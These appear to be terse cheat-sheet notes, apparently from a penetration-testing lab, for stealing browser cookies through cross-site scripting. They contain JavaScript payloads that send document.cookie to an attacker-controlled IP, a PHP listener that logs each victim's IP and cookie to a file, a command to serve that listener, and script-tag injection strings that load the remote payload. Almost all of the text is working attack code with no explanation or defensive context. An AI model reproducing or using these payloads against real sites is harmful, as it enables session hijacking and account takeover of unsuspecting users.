Put one of the payloads into script.js
```js
document.location='http://10.10.15.8/index.php?c='+document.cookie;
new Image().src='http://10.10.15.8/index.php?c='+document.cookie;
```

PHP server for catching cookies

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```shell
sudo php -S 0.0.0.0:80
```

Final payload
```bash
<script src=http://10.10.15.8/script.js></script>
'><script src=http://10.10.15.8/script.js></script>
"><script src=http://10.10.15.8/script.js></script>
```